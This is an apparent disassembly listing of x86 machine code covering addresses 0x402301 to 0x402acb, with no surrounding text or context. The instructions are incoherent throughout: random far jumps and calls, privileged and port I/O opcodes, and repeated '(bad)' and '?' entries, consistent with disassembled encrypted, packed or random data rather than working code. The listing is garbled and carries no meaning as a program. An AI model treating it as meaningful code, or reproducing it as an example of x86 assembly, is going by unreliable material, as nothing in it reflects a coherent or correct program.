  402301:	jmp    0xc80d4683
  402306:	jbe    0x402303
  402308:	fnstenv [esi-0x3f8beecd]
  40230e:	xchg   edi,eax
  40230f:	clc    
  402310:	dec    eax
  402311:	aad    0x42
  402313:	hlt    
  402314:	or     eax,0xf588b8f2
  402319:	jno    0x40236b
  40231b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40231c:	(bad)  
  40231d:	lods   eax,DWORD PTR ds:[esi]
  40231e:	(bad)
  402321:	inc    ebp
  402322:	sub    eax,0x312b25dc
  402327:	push   ss
  402328:	mov    ch,0xe0
  40232a:	aad    0xfe
  40232c:	xlat   BYTE PTR ds:[ebx]
  40232d:	aad    0xb6
  40232f:	inc    BYTE PTR [esi]
  402331:	mov    BYTE PTR [ebx-0x2e78c8ec],bh
  402337:	in     al,dx
  402338:	pushf  
  402339:	in     eax,dx
  40233a:	pop    DWORD PTR [edx]
  40233c:	sbb    edi,DWORD PTR [ebx+0x3f0cab54]
  402342:	es pop bx
  402345:	and    DWORD PTR [eax+0x60],edx
  402348:	mov    ebx,0x287fc48e
  40234d:	push   0x5b68d97e
  402352:	shr    BYTE PTR [ebx+0x35e53e36],cl
  402358:	loope  0x4023ab
  40235a:	pop    ebx
  40235b:	mov    ebp,eax
  40235d:	ds add eax,0xfe5e1c82
  402363:	stc    
  402364:	nop
  402365:	jecxz  0x40239d
  402367:	xor    DWORD PTR [esi-0x56],eax
  40236a:	ficom  DWORD PTR [edx-0x143df675]
  402370:	cmp    DWORD PTR [esi+0x7d87d970],edi
  402376:	sar    DWORD PTR [edx],0xc8
  402379:	(bad)  
  40237a:	pusha  
  40237b:	dec    esi
  40237c:	mov    WORD PTR [eax],cs
  40237e:	mov    esi,0x916e7f6d
  402383:	inc    ebx
  402384:	sub    dh,BYTE PTR [ebx-0x43]
  402387:	aad    0x87
  402389:	std    
  40238a:	adc    bl,BYTE PTR [edi+0x4]
  40238d:	lea    ebp,[edi+eax*1+0x3b13e97f]
  402394:	mov    edx,0x4f1eaaf2
  402399:	aas    
  40239a:	jae    0x4023a0
  40239c:	cmp    eax,0x15bb2a63
  4023a1:	push   ebx
  4023a2:	inc    edx
  4023a3:	pop    ecx
  4023a4:	push   edi
  4023a5:	rcr    BYTE PTR [eax+0x66],0x43
  4023a9:	add    eax,0xb8ff5981
  4023ae:	push   0xffffff88
  4023b0:	(bad)  
  4023b1:	cmp    BYTE PTR [ecx-0x40c9983],al
  4023b7:	xlat   BYTE PTR ds:[ebx]
  4023b8:	cdq    
  4023b9:	or     al,0x1b
  4023bb:	jb     0x402359
  4023bd:	les    ecx,FWORD PTR [edi+0x5e]
  4023c0:	push   0x2bc8c032
  4023c5:	retf   
  4023c6:	out    0xa8,eax
  4023c8:	aaa    
  4023c9:	xlat   BYTE PTR ds:[ebx]
  4023ca:	mov    cl,0x41
  4023cc:	cmp    BYTE PTR [bx+0x73be],ah
  4023d1:	adc    BYTE PTR [edx-0x23],dh
  4023d4:	push   ds
  4023d5:	sbb    esi,DWORD PTR [eax]
  4023d7:	jmp    0xf9f4:0x16b17ea2
  4023de:	sub    BYTE PTR [edx-0x384b3c0e],dh
  4023e4:	dec    esp
  4023e5:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4023e6:	xor    al,bh
  4023e8:	xchg   ecx,eax
  4023e9:	mov    eax,0xd2736a30
  4023ee:	ins    BYTE PTR es:[edi],dx
  4023ef:	pop    eax
  4023f0:	xchg   edi,eax
  4023f1:	neg    BYTE PTR [edi-0x69]
  4023f4:	mov    dh,0x4e
  4023f6:	mov    esi,0xb8001fec
  4023fb:	pushf  
  4023fc:	add    ch,BYTE PTR [ecx+0xac58186]
  402402:	bound  eax,QWORD PTR [ebp-0x4b6c7bcf]
  402408:	dec    esi
  402409:	bound  edi,QWORD PTR [edx]
  40240b:	dec    ebx
  40240c:	xchg   ebx,eax
  40240d:	mov    ebx,DWORD PTR [ebx+eax*1+0x56]
  402411:	imul   eax,edx,0x6a0b4244
  402417:	inc    eax
  402418:	pop    ds
  402419:	test   DWORD PTR [ecx-0x24655322],eax
  40241f:	push   0x2b
  402421:	leave  
  402422:	aas    
  402423:	and    ebx,ebp
  402425:	xchg   ebx,eax
  402426:	add    esp,DWORD PTR [ebx-0x3945841b]
  40242c:	mov    edi,0x2ae0a64c
  402431:	idiv   edi
  402433:	sbb    al,0x1f
  402435:	or     ecx,DWORD PTR [ebp-0x679bc11f]
  40243b:	mov    bl,dh
  40243d:	jae    0x402486
  40243f:	jbe    0x402462
  402441:	ins    DWORD PTR es:[edi],dx
  402442:	jle    0x402467
  402444:	lods   eax,DWORD PTR ds:[esi]
  402445:	pushf  
  402446:	mov    DWORD PTR cs:[eax+ecx*1-0x1d],ebp
  40244b:	rol    DWORD PTR [edi],0x20
  40244e:	pop    ecx
  40244f:	(bad)  
  402451:	inc    esp
  402452:	loop   0x402476
  402454:	push   esi
  402455:	cli    
  402456:	sub    bl,0x2d
  402459:	inc    esp
  40245a:	es hlt 
  40245c:	add    ebx,DWORD PTR [esi+edi*1]
  40245f:	sbb    DWORD PTR [ebx],esp
  402461:	jmp    0xf4d0:0x57e51c0d
  402468:	mov    ch,0x83
  40246a:	int    0xcc
  40246c:	loop   0x40248d
  40246e:	cmp    BYTE PTR [edx-0xe5ad166],ah
  402474:	aas    
  402475:	les    ebp,FWORD PTR [esi+0x502a03f2]
  40247b:	leave  
  40247c:	in     eax,0x30
  40247e:	mov    al,BYTE PTR [ebx]
  402480:	mov    dl,0x85
  402482:	jl     0x40240a
  402484:	adc    DWORD PTR [ecx-0x17],ebp
  402487:	and    al,BYTE PTR [ecx+0xa]
  40248a:	dec    esi
  40248b:	mov    ebp,?
  40248d:	adc    eax,0x99a59139
  402492:	push   edx
  402493:	jae    0x40248b
  402495:	test   eax,0xabd5c920
  40249a:	sub    DWORD PTR [eax+0x230eb2e9],0xfffffffa
  4024a1:	push   esp
  4024a2:	sbb    al,0xc7
  4024a4:	push   cs
  4024a5:	ret    
  4024a6:	int3   
  4024a7:	fcomp  QWORD PTR [ebx-0x7d]
  4024aa:	push   ebp
  4024ab:	push   ebp
  4024ac:	loop   0x402432
  4024ae:	mov    al,BYTE PTR [ebx-0x44]
  4024b1:	xor    ch,BYTE PTR [edx]
  4024b3:	xchg   esi,eax
  4024b4:	add    edi,DWORD PTR [ecx+0x47]
  4024b7:	pop    esp
  4024b8:	popa   
  4024b9:	arpl   WORD PTR [ebp+0x15],di
  4024bc:	push   0x74
  4024be:	dec    eax
  4024bf:	ret    0x4c79
  4024c2:	dec    ebp
  4024c3:	mov    es,WORD PTR [eax-0x603e69bb]
  4024c9:	cmp    eax,0x1215d911
  4024ce:	xor    eax,0x4e906625
  4024d3:	fnstcw WORD PTR [edx-0x18aa369f]
  4024d9:	pop    ds
  4024da:	adc    dl,al
  4024dc:	cmc    
  4024dd:	mov    dh,0x9e
  4024df:	mov    bl,0x8f
  4024e1:	aaa    
  4024e2:	and    eax,0x7a07edce
  4024e7:	push   ecx
  4024e8:	stos   DWORD PTR es:[edi],eax
  4024e9:	xor    BYTE PTR [edi-0x66],ah
  4024ec:	xchg   esi,eax
  4024ed:	lds    esi,FWORD PTR [esp+esi*4-0x1d]
  4024f1:	pusha  
  4024f2:	add    ebx,ecx
  4024f4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4024f5:	mov    dh,BYTE PTR [eax-0x13]
  4024f8:	add    BYTE PTR [ebp+0x34287627],dl
  4024fe:	jnp    0x402521
  402500:	in     eax,0x1f
  402502:	ja     0x402513
  402504:	adc    BYTE PTR [ecx-0x68ef7a65],ch
  40250a:	inc    edx
  40250b:	test   al,0xa8
  40250d:	retf   
  40250e:	test   al,0x28
  402510:	aas    
  402511:	mov    ebp,0x3308bff3
  402516:	sti    
  402517:	xchg   ebp,eax
  402518:	push   cs
  402519:	add    bh,BYTE PTR [edx-0x18f47dc3]
  40251f:	fucomip st,st(0)
  402521:	jne    0x402574
  402523:	dec    ecx
  402524:	std    
  402525:	xchg   eax,edi
  402527:	aas    
  402528:	mov    ds:0x21dfd92b,eax
  40252d:	xchg   BYTE PTR [edx+0x50],dl
  402530:	add    esi,DWORD PTR [edi+0x4cb234f4]
  402536:	pusha  
  402537:	adc    ebx,ebp
  402539:	and    eax,0xf8b1a8b1
  40253e:	cmp    BYTE PTR [ebx],cl
  402540:	nop
  402541:	test   BYTE PTR [ecx],0x2
  402544:	jns    0x4025bf
  402546:	adc    eax,0x465049c1
  40254b:	dec    edx
  40254c:	inc    esp
  40254d:	inc    edi
  40254e:	in     eax,0xbf
  402550:	fwait
  402551:	nop
  402552:	jle    0x402503
  402554:	xor    ebp,DWORD PTR [edx]
  402556:	icebp  
  402557:	aam    0xe1
  402559:	dec    edi
  40255a:	enter  0x4d32,0xb5
  40255e:	fimul  WORD PTR [esi+0x3a0ec541]
  402564:	nop
  402565:	sahf   
  402566:	push   edi
  402567:	mov    al,0x5c
  402569:	sub    DWORD PTR [ecx+0x59396eaf],ecx
  40256f:	push   ds
  402570:	outs   dx,BYTE PTR ds:[esi]
  402571:	mov    BYTE PTR [ebx+edi*4-0x5d96380e],ah
  402578:	fs inc ecx
  40257a:	sub    ebx,ecx
  40257c:	call   0x7eb9:0xdc920ac9
  402583:	std    
  402584:	clc    
  402585:	dec    edi
  402586:	push   esi
  402587:	ret    0xc202
  40258a:	rcr    ebp,cl
  40258c:	call   0x80e4:0x13a4f425
  402593:	cmp    ecx,DWORD PTR [eax]
  402595:	and    DWORD PTR [edx],edi
  402597:	into   
  402598:	cmp    dl,al
  40259a:	and    eax,0x8ce84ce7
  40259f:	(bad)  
  4025a1:	gs pushf 
  4025a3:	sub    bl,BYTE PTR [ebp+0x17cdecdf]
  4025a9:	adc    al,0x82
  4025ab:	lods   al,BYTE PTR ds:[esi]
  4025ac:	add    eax,0xb6c09af5
  4025b1:	hlt    
  4025b2:	xchg   ebp,eax
  4025b3:	cmc    
  4025b4:	dec    esp
  4025b5:	xlat   BYTE PTR ds:[ebx]
  4025b6:	jno    0x40253c
  4025b8:	add    bh,ch
  4025ba:	sbb    al,0xcf
  4025bc:	fst    DWORD PTR [esi-0x60470fda]
  4025c2:	inc    edi
  4025c3:	pop    ss
  4025c4:	aaa    
  4025c5:	add    eax,0x6a5c853e
  4025ca:	mov    esi,0xea3144db
  4025cf:	mov    ah,0xcd
  4025d1:	cld    
  4025d2:	outs   dx,BYTE PTR ds:[esi]
  4025d3:	jb     0x4025ff
  4025d5:	fdiv   QWORD PTR [ecx+0x36]
  4025d8:	dec    ecx
  4025d9:	dec    ecx
  4025da:	cs jo  0x4025f4
  4025dd:	inc    eax
  4025de:	div    esi
  4025e0:	add    BYTE PTR [edx+0x5dee7389],al
  4025e6:	clc    
  4025e7:	pop    ss
  4025e8:	cmp    DWORD PTR [eax-0x10378a5c],ebx
  4025ee:	xor    DWORD PTR [edx],edi
  4025f0:	das    
  4025f1:	inc    ecx
  4025f2:	data16 in al,dx
  4025f4:	test   BYTE PTR ds:[edi-0x2a1f1b64],dh
  4025fb:	inc    ebp
  4025fc:	pop    eax
  4025fd:	sar    DWORD PTR [edi],0xd9
  402600:	and    al,0xaf
  402602:	cmp    ecx,DWORD PTR [esi+0x76a7a364]
  402608:	shr    BYTE PTR [edx],cl
  40260a:	not    DWORD PTR [ebx+edi*2-0x6c]
  40260e:	pop    edi
  40260f:	xchg   DWORD PTR [ebx+0x467ba3a8],ebx
  402615:	or     ebp,DWORD PTR [ecx-0x7b]
  402618:	les    ebx,FWORD PTR ds:0xf272d13c
  40261e:	bnd gs js 0x4025b0
  402622:	in     al,0x85
  402624:	hlt    
  402625:	jg     0x402603
  402627:	fidivr DWORD PTR [edx-0x1f757cb4]
  40262d:	xor    dh,BYTE PTR [edi-0x70]
  402630:	sub    eax,0xd2814a2e
  402635:	add    ebx,esp
  402637:	pop    es
  402638:	(bad)  
  402639:	in     eax,0xb8
  40263b:	mov    WORD PTR [eax+ebp*1],cs
  40263e:	repz fidiv DWORD PTR [eax]
  402641:	mov    eax,ds:0x8304b9fc
  402646:	push   0x22f16fee
  40264b:	iret   
  40264c:	push   es
  40264d:	adc    eax,0x83f7bb1a
  402652:	add    DWORD PTR [ebx-0x3f],ebx
  402655:	fnstsw WORD PTR [esi-0x73e4f69e]
  40265b:	sbb    dl,BYTE PTR [ebx+ecx*2+0x33d63e4f]
  402662:	inc    esp
  402663:	xchg   edi,eax
  402664:	mov    dh,0x2
  402666:	and    al,0x82
  402668:	mov    ds:0x83514be6,eax
  40266d:	inc    ecx
  40266e:	dec    ecx
  40266f:	push   0xffffff9d
  402671:	ficom  DWORD PTR [ecx]
  402673:	bound  edi,QWORD PTR [ecx]
  402675:	cmc    
  402676:	mov    eax,0xf0b50171
  40267b:	push   esp
  40267c:	pop    es
  40267d:	jb     0x40262b
  40267f:	inc    BYTE PTR [ecx+ecx*4]
  402682:	push   ds
  402683:	mov    ebp,0x535ea32c
  402688:	sub    DWORD PTR [eax+eiz*2+0x10ce0daf],esi
  40268f:	sub    bh,BYTE PTR [ecx]
  402691:	or     ah,BYTE PTR [eax-0x47710ad9]
  402697:	rcr    BYTE PTR [ebx-0x2cf3297f],cl
  40269d:	aad    0x53
  40269f:	pop    ds
  4026a0:	cli    
  4026a1:	sub    al,BYTE PTR [ebp+ebp*1-0x12]
  4026a5:	rcl    esi,cl
  4026a7:	fucom  st(3)
  4026a9:	dec    edx
  4026aa:	inc    edi
  4026ab:	jb     0x402653
  4026ad:	aad    0x52
  4026af:	cmp    eax,0x70a08426
  4026b4:	xor    edx,DWORD PTR es:[ebp+0x14]
  4026b8:	dec    esp
  4026b9:	aam    0xe5
  4026bb:	lock inc edx
  4026bd:	cmp    al,BYTE PTR [edx+0x5]
  4026c0:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4026c1:	push   eax
  4026c2:	or     BYTE PTR [esi+0x1dbc56b0],ch
  4026c8:	ficom  DWORD PTR [edx]
  4026ca:	push   esi
  4026cb:	jbe    0x4026ec
  4026cd:	daa    
  4026ce:	pop    ds
  4026cf:	pop    es
  4026d0:	push   0x8aa13c72
  4026d5:	mov    BYTE PTR [edx-0x63],ch
  4026d8:	adc    BYTE PTR [esi-0x2c],ch
  4026db:	int3   
  4026dc:	pop    edx
  4026dd:	adc    eax,0xa3c2029a
  4026e2:	inc    edi
  4026e3:	and    ebx,DWORD PTR [ecx]
  4026e5:	mov    bl,BYTE PTR [edx-0x337bea4b]
  4026eb:	mov    BYTE PTR [esi],bh
  4026ed:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4026ee:	jmp    0x4026ff
  4026f0:	add    BYTE PTR [esp+ecx*8],dl
  4026f3:	mov    ds:0x9adcb0f6,eax
  4026f8:	cld    
  4026f9:	sbb    eax,0xf80f6f0d
  4026fe:	enter  0x8055,0xc3
  402702:	mov    ebx,DWORD PTR fs:[ecx+0x5c]
  402706:	sub    edi,esp
  402708:	ret    
  402709:	add    DWORD PTR [esi-0x25da9595],edx
  40270f:	int3   
  402710:	in     eax,dx
  402711:	xor    DWORD PTR [edi-0x2704d275],esp
  402717:	stc    
  402718:	rcl    BYTE PTR [eax],cl
  40271a:	pop    edi
  40271b:	sbb    esp,DWORD PTR [edx]
  40271d:	inc    ebp
  40271e:	sar    DWORD PTR [edi-0x36bb28aa],cl
  402724:	jge    0x40279f
  402726:	out    dx,eax
  402727:	cld    
  402728:	mov    DWORD PTR [esi+edx*8+0x7d0d1cf2],eax
  40272f:	cmc    
  402730:	xchg   BYTE PTR [esi+edx*8],dh
  402733:	and    ah,BYTE PTR [edi]
  402735:	arpl   WORD PTR [edx],sp
  402737:	and    ebx,DWORD PTR [eax-0x46]
  40273a:	cdq    
  40273b:	jne    0x40278f
  40273d:	loopne 0x402780
  40273f:	dec    edi
  402740:	mov    eax,0xda7a0cd2
  402745:	int    0x51
  402747:	push   esi
  402748:	sbb    BYTE PTR [ebx+ecx*2+0x7c],bl
  40274c:	pop    edi
  40274d:	cmc    
  40274e:	xchg   ecx,eax
  40274f:	cmc    
  402750:	cmc    
  402751:	mov    ah,0xf4
  402753:	add    BYTE PTR es:[edx],al
  402756:	dec    eax
  402757:	cmp    BYTE PTR [edi+edx*4+0x1e8404d6],dl
  40275e:	mov    dl,0x84
  402760:	xchg   ebx,eax
  402761:	adc    DWORD PTR [ebx-0x4780a62c],eax
  402767:	inc    edx
  402768:	push   es
  402769:	jle    0x4027cb
  40276b:	imul   ebx,DWORD PTR [edx-0x6250ecfc],0xffffff89
  402772:	xor    ecx,DWORD PTR [ebx-0x30]
  402775:	inc    esi
  402776:	dec    esi
  402777:	add    eax,0xee1dca05
  40277c:	jb     0x40277c
  40277e:	push   ecx
  40277f:	cld    
  402780:	sbb    dl,BYTE PTR ds:0x3ddefab1
  402786:	xlat   BYTE PTR ds:[ebx]
  402787:	jecxz  0x4027e6
  402789:	dec    ecx
  40278a:	xor    al,0x1d
  40278c:	(bad)  
  40278d:	stos   DWORD PTR es:[edi],eax
  40278e:	jo     0x4027b5
  402790:	sub    DWORD PTR [ecx+0x7c1d9309],edi
  402796:	sbb    ecx,esp
  402798:	xor    eax,0xdfa034a0
  40279d:	icebp  
  40279e:	pop    esp
  40279f:	cmp    DWORD PTR [ebp-0x5f],esi
  4027a2:	and    DWORD PTR ds:0x49392969,ebx
  4027a8:	and    BYTE PTR [esi+edi*1],bl
  4027ab:	popf   
  4027ac:	jg     0x402785
  4027ae:	xor    eax,0x608379fb
  4027b3:	xchg   esi,eax
  4027b4:	cmp    dl,BYTE PTR [edx-0x2f5c01f7]
  4027ba:	cmp    eax,edx
  4027bc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027bd:	retf   
  4027be:	retf   
  4027bf:	xchg   bh,ch
  4027c1:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4027c2:	mov    esi,0xabb20917
  4027c7:	push   ecx
  4027c8:	xor    eax,0xc318578c
  4027cd:	push   cs
  4027ce:	adc    bh,BYTE PTR [edi-0x33]
  4027d1:	mov    ax,ds:0x754a6365
  4027d7:	push   ebp
  4027d8:	adc    BYTE PTR [edi],dh
  4027da:	xor    DWORD PTR ds:0xf3adaccf,0x5
  4027e1:	mov    edi,0xbd76ebaa
  4027e6:	sub    esp,esp
  4027e8:	fwait
  4027e9:	inc    edx
  4027ea:	sub    DWORD PTR gs:[eax+ebx*2+0x76],ebp
  4027ef:	loope  0x40285c
  4027f1:	sahf   
  4027f2:	xchg   BYTE PTR [esi],al
  4027f4:	ret    0x711e
  4027f7:	or     eax,0x5cfaec1
  4027fc:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4027fd:	add    esi,0xffffffd8
  402800:	jbe    0x40280a
  402802:	cmp    DWORD PTR [ebp+0x28bff176],eax
  402808:	mov    ebx,DWORD PTR [eax-0x62]
  40280b:	mov    ah,0xaa
  40280d:	adc    al,0x7d
  402810:	lds    esi,FWORD PTR [eax-0x57]
  402813:	mov    bh,0xb6
  402815:	xchg   DWORD PTR ds:0x8a5a604a,ebx
  40281b:	adc    al,dl
  40281d:	dec    edi
  40281e:	cmc    
  40281f:	gs sub eax,0xd0d17704
  402825:	mov    cs,WORD PTR [edi]
  402827:	enter  0x1048,0xc2
  40282b:	xlat   BYTE PTR ds:[ebx]
  40282c:	xchg   ebx,eax
  40282d:	fld    QWORD PTR [edi]
  40282f:	call   0x88abe1ad
  402834:	test   BYTE PTR [ecx],cl
  402836:	fidiv  DWORD PTR [esi+0x48e845a5]
  40283c:	fwait
  40283d:	push   0xfffffffc
  40283f:	test   ah,0x4
  402842:	sbb    ebx,DWORD PTR [eax]
  402844:	xchg   esp,eax
  402845:	sub    ah,BYTE PTR [ebx+eiz*1+0x65]
  402849:	push   ebp
  40284a:	xchg   edx,eax
  40284b:	dec    ebx
  40284c:	mov    ebp,DWORD PTR ss:[ebp+0x36]
  402850:	and    eax,0xeb7361c2
  402855:	mov    dl,0x7e
  402857:	inc    eax
  402858:	push   esi
  402859:	leave  
  40285a:	jns    0x402843
  40285c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40285d:	retf   0x530d
  402860:	mov    esi,DWORD PTR [esi+0xf]
  402863:	and    ecx,0xfffffff1
  402866:	out    0xac,al
  402868:	arpl   sp,dx
  40286a:	mov    BYTE PTR [eiz*1+0x3ae5da0],ch
  402871:	fmul   QWORD PTR [eax+eiz*8-0x49562ea6]
  402878:	cmp    ch,al
  40287a:	jne    0x4028ac
  40287c:	mov    esi,0x97c1c576
  402881:	daa    
  402882:	push   es
  402883:	loop   0x4028f2
  402885:	cvtpi2ps xmm0,QWORD PTR [eax-0x75]
  402889:	shl    BYTE PTR [esi+0x6f1be3fb],1
  40288f:	and    ecx,DWORD PTR [ebp-0x7]
  402892:	pop    esi
  402893:	jg     0x4028b4
  402895:	pop    eax
  402896:	push   ss
  402897:	test   DWORD PTR [eax],0xfca60c5a
  40289d:	clc    
  40289e:	push   esi
  40289f:	jle    0x40290b
  4028a1:	xor    edi,DWORD PTR [ecx]
  4028a3:	repnz div DWORD PTR [edx-0x2a]
  4028a7:	xlat   BYTE PTR ds:[ebx]
  4028a8:	daa    
  4028a9:	dec    esi
  4028aa:	ror    dh,0xa3
  4028ad:	mov    ds:0xbad50a0f,eax
  4028b2:	cwde   
  4028b3:	retf   0x2889
  4028b6:	jbe    0x4028c4
  4028b8:	pop    ecx
  4028b9:	pop    eax
  4028ba:	sbb    eax,ebx
  4028bc:	fwait
  4028bd:	pop    ecx
  4028be:	cmp    eax,0xf490fcea
  4028c3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4028c4:	cmp    edx,DWORD PTR [ebx-0x47]
  4028c7:	dec    ecx
  4028c8:	inc    ecx
  4028c9:	ja     0x4028d6
  4028cb:	mov    dh,0x83
  4028cd:	xor    al,0x5d
  4028cf:	adc    eax,0xea106e76
  4028d4:	movups XMMWORD PTR [edx-0x2cf6d4f1],xmm0
  4028db:	xchg   esi,eax
  4028dc:	aaa    
  4028dd:	xlat   BYTE PTR ds:[ebx]
  4028de:	int3   
  4028df:	pop    ebp
  4028e0:	or     eax,0xf1c3cf33
  4028e5:	lds    edx,FWORD PTR [ebx+0x1d]
  4028e8:	adc    eax,0x60feeb1f
  4028ed:	jb     0x40288b
  4028ef:	jle    0x4028bb
  4028f1:	adc    ebx,DWORD PTR [edx+0x7]
  4028f4:	ins    DWORD PTR es:[edi],dx
  4028f5:	gs das 
  4028f7:	pop    ebp
  4028f8:	(bad)  
  4028f9:	sti    
  4028fa:	mov    gs,WORD PTR [edx]
  4028fc:	push   0x44
  4028fe:	jns    0x402972
  402900:	add    al,0xec
  402902:	loope  0x4028df
  402904:	sbb    ch,BYTE PTR [esi]
  402906:	xchg   ebp,eax
  402907:	inc    esi
  402908:	dec    esi
  402909:	out    dx,eax
  40290a:	lahf   
  40290b:	cmp    al,0xb1
  40290d:	hlt    
  40290e:	xor    ebx,eax
  402910:	call   0xc8b2:0xfe108702
  402917:	pop    ebx
  402918:	add    al,0x18
  40291a:	jmp    0x8bba5573
  40291f:	loop   0x402975
  402921:	mov    esp,0x25950ac7
  402926:	xor    esi,edx
  402928:	jne    0x402977
  40292a:	in     al,dx
  40292b:	xchg   ecx,eax
  40292c:	xchg   esp,eax
  40292d:	inc    edx
  40292e:	inc    edi
  40292f:	and    BYTE PTR [ecx+0x40618751],0xed
  402936:	push   ds
  402937:	mov    eax,0x250e35e6
  40293c:	sbb    ch,dh
  40293e:	shr    BYTE PTR [ebx],0xd3
  402941:	les    esi,FWORD PTR [edi-0x50]
  402944:	outs   dx,BYTE PTR ds:[esi]
  402945:	loope  0x4029c1
  402947:	test   BYTE PTR [ebp+0x6b],ch
  40294a:	aad    0x32
  40294c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40294d:	es loop 0x402922
  402950:	sbb    eax,0xb55cabb6
  402955:	daa    
  402956:	das    
  402957:	push   ss
  402958:	jbe    0x402950
  40295a:	mov    eax,ds:0xda57a4ae
  40295f:	lds    esp,FWORD PTR [ebx+0x45a41f5b]
  402965:	sub    al,0xa4
  402967:	jbe    0x4028f0
  402969:	mov    eax,0x2d976d31
  40296e:	pop    edx
  40296f:	push   eax
  402970:	(bad)  
  402971:	mul    BYTE PTR [eax+0x2cfaafec]
  402977:	inc    ebx
  402978:	lock add al,0x37
  40297b:	in     al,dx
  40297c:	cmp    BYTE PTR [esi],bh
  40297e:	add    BYTE PTR [ecx+eax*2-0x32],ch
  402982:	cmp    al,BYTE PTR [ebx-0x4]
  402985:	sub    ah,dh
  402987:	fstp   QWORD PTR ds:0xe3d8c30e
  40298d:	jge    0x40297f
  40298f:	push   eax
  402990:	xor    bh,BYTE PTR [edi-0x27c53100]
  402996:	sahf   
  402997:	mov    eax,0xdb6dbfa9
  40299c:	nop
  40299d:	(bad)  
  40299e:	cmp    al,0x79
  4029a0:	mov    eax,ds:0xe386af10
  4029a5:	xlat   BYTE PTR ds:[ebx]
  4029a6:	sbb    DWORD PTR [edi+0x19],0x3574b5ad
  4029ad:	cwde   
  4029ae:	xor    eax,0x3de84bb4
  4029b3:	mov    WORD PTR [esi-0x6c10b271],?
  4029b9:	aad    0x42
  4029bb:	lock test BYTE PTR [eax+0x2f],bh
  4029bf:	or     ecx,esi
  4029c1:	or     ebx,ebp
  4029c3:	add    bh,cl
  4029c5:	and    al,0x68
  4029c8:	adc    ch,bh
  4029ca:	sbb    BYTE PTR [edx],cl
  4029cc:	sub    BYTE PTR [edx],dh
  4029ce:	or     dl,al
  4029d0:	cmp    BYTE PTR [esi+0x626cf3ff],ch
  4029d6:	adc    eax,0x6924051c
  4029db:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4029dc:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4029dd:	jp     0x402a17
  4029df:	retf   
  4029e0:	xor    DWORD PTR [ebx],esi
  4029e2:	cwde   
  4029e3:	lock and ch,BYTE PTR [esi+0x567f5183]
  4029ea:	aas    
  4029eb:	in     eax,dx
  4029ec:	(bad)
  4029ef:	sub    BYTE PTR [ecx-0x1675bd21],bl
  4029f5:	es aas 
  4029f7:	(bad)  
  4029f8:	jg     0x4029d9
  4029fa:	repz std 
  4029fc:	stos   DWORD PTR es:[edi],eax
  4029fd:	mov    edi,0x795ab6ae
  402a02:	xlat   BYTE PTR ds:[ebx]
  402a03:	sub    dl,BYTE PTR [ebx]
  402a05:	push   esi
  402a06:	fst    QWORD PTR [ebp-0x12]
  402a09:	ins    BYTE PTR es:[edi],dx
  402a0a:	adc    DWORD PTR fs:[ecx],ebp
  402a0d:	scas   eax,DWORD PTR es:[edi]
  402a0e:	popa   
  402a0f:	push   0x18
  402a11:	les    esp,FWORD PTR [ecx+edi*2-0x5a92c1e1]
  402a18:	cmp    BYTE PTR [esi],0x90
  402a1b:	mov    dl,0xac
  402a1d:	lods   al,BYTE PTR ds:[esi]
  402a1e:	mov    BYTE PTR [eax-0x6f333db7],dh
  402a24:	and    dl,BYTE PTR [eax+ebp*4+0x6d]
  402a28:	lds    esi,FWORD PTR [edi+0x6f]
  402a2b:	sahf   
  402a2c:	cmp    BYTE PTR [ecx-0x6231a32e],0xe4
  402a33:	cdq    
  402a34:	test   BYTE PTR [eax+esi*1-0x41],bl
  402a38:	in     eax,0x48
  402a3a:	and    esi,ecx
  402a3c:	ja     0x402a13
  402a3e:	cwde   
  402a3f:	fs dec eax
  402a41:	bound  ebp,QWORD PTR [eax-0x5b]
  402a44:	push   0xea9a9bcb
  402a49:	add    BYTE PTR [esp+ecx*2],dh
  402a4c:	and    edx,ecx
  402a4e:	sar    DWORD PTR [eax],cl
  402a50:	loopne 0x4029d4
  402a52:	loopne 0x4029fa
  402a54:	jge    0x402a7f
  402a56:	cs ins DWORD PTR es:[edi],dx
  402a58:	sub    DWORD PTR [edx+0x4],edx
  402a5b:	mov    dl,0xf6
  402a5d:	int    0x68
  402a5f:	cld    
  402a60:	ins    BYTE PTR es:[edi],dx
  402a61:	jns    0x402a62
  402a63:	add    eax,0x6c8f6ae5
  402a68:	push   0x32
  402a6a:	mov    esp,0x5754684f
  402a6f:	pop    esi
  402a70:	mov    dh,0xf
  402a72:	bound  edx,QWORD PTR [edx+esi*4-0x79]
  402a76:	sbb    eax,0x8d95a8db
  402a7b:	cmp    al,0x85
  402a7d:	cmp    BYTE PTR [eax-0x47751ca8],0x39
  402a84:	adc    al,0x2
  402a86:	fs call 0x7e323627
  402a8c:	fmul   QWORD PTR [esi+0x3a96c129]
  402a92:	aaa    
  402a93:	nop
  402a94:	xor    DWORD PTR [ebx+ebp*8+0x5a],ebp
  402a98:	jp     0x402a7b
  402a9a:	fld    QWORD PTR [esi+0x681ef582]
  402aa0:	sbb    al,bh
  402aa2:	adc    ch,ch
  402aa4:	mov    bl,BYTE PTR [eax]
  402aa6:	adc    eax,edx
  402aa8:	mov    BYTE PTR [eax+0x4a],bl
  402aab:	out    dx,al
  402aac:	and    ch,ch
  402aae:	mov    esi,esi
  402ab0:	sbb    eax,0x8d7ced6c
  402ab5:	shr    DWORD PTR [esi],cl
  402ab7:	xchg   ebx,eax
  402ab8:	(bad)  
  402ab9:	out    dx,eax
  402aba:	outs   dx,DWORD PTR ds:[esi]
  402abb:	mov    eax,ds:0xce257e8a
  402ac0:	aam    0x68
  402ac2:	dec    edx
  402ac3:	inc    ecx
  402ac4:	xchg   ebp,eax
  402ac5:	nop
  402ac6:	outs   dx,DWORD PTR ds:[esi]
  402ac7:	stc    
  402ac8:	(bad)  
  402aca:	outs   dx,BYTE PTR ds:[esi]
  402acb:	ss sub eax,0xda4736da
